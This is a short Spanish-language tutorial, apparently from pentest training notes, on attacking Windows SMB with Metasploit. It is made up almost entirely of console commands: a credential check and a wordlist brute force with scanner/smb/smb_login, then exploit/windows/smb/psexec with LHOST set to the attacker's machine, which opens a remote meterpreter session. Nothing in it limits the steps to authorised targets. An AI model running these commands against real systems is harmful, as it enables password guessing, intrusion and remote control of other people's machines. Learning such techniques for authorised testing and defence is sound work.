# Explotación de SMB con PsExec y Metasploit

## 1. Escaneo de credenciales con `scanner/smb/smb_login`

Primero intentamos acceder al objetivo usando credenciales conocidas o realizando un ataque de fuerza bruta.

### Con credenciales conocidas

Abrir Metasploit:
```
msfconsole
```

Dentro de Metasploit:
```
use auxiliary/scanner/smb/smb_login
set RHOSTS <IP_OBJETIVO>
set SMBUser <USUARIO>
set SMBPass <CONTRASEÑA>
set THREADS 10
run
```

## 2. Fuerza bruta con listas de usuarios y contraseñas

Si no tenemos credenciales, podemos usar las listas que vienen con Metasploit para probar combinaciones.

### Con archivo de usuarios y archivo de contraseñas

```
use auxiliary/scanner/smb/smb_login
set RHOSTS <IP_OBJETIVO>
set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
set pass_file /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set THREADS 10
run
```

También puedes usar sólo un diccionario de usuarios con una contraseña fija o viceversa.

## 3. Explotación con PsExec

Cuando consigamos credenciales válidas con privilegios de administrador, podemos ejecutar comandos remotos con PsExec.

### Uso de `exploit/windows/smb/psexec`

```
use exploit/windows/smb/psexec
set RHOSTS <IP_OBJETIVO>
set SMBUser <USUARIO>
set SMBPass <CONTRASEÑA>
set LHOST <TU_IP>
exploit
```

Esto abrirá una sesión de `meterpreter` si las credenciales son correctas y tienen privilegios suficientes.

